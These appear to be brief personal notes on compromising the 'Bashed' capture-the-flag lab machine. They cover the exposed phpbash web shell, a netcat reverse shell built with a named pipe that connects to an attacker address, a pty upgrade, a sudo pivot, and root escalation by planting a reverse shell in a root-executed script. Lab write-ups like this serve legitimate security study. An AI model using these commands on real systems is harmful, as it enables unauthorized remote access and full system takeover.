## bashed

10.10.10.68

Apache/2.4.18 Ubuntu
4.4.0-62-generic

https://github.com/cfreal/exploits/tree/master/CVE-2019-0211-apache

http://10.10.10.68/dev/phpbash.php

since no -e option for netcat

find world writeable folders (`/tmp/`)

do 

`victim$ mknod /tmp/backpipe p`

`victim$ /bin/sh 0</tmp/backpipe | nc 10.10.14.9 443 1>/tmp/backpipe `



python -c 'import pty; pty.spawn("/bin/sh")'
sudo -u scriptmanager -i

scriptmanager can access /scripts/test.py which contains a root owned file output so root must be executing the script.py

put reverse shell in the script for execution.